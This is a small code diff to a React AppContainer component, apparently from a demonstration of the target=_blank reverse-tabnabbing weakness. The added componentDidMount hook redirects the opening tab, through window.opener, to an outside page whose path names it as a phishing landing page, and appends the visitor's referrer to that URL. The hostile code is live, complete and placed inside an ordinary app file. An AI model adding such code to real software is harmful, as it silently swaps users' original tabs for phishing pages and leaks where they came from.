@@ -14,6 +14,12 @@ export default class AppContainer extends Component {
     params: PropTypes.object,
   };
 
+  componentDidMount() {
+    if (window.opener) {
+      window.opener.location = "https://khoanguyen.me/phishing-target-blank/landing.html?referrer="+document.referrer
+    }
+  }
+
   render() {
     return (
       <Ga params={ this.props.params }>
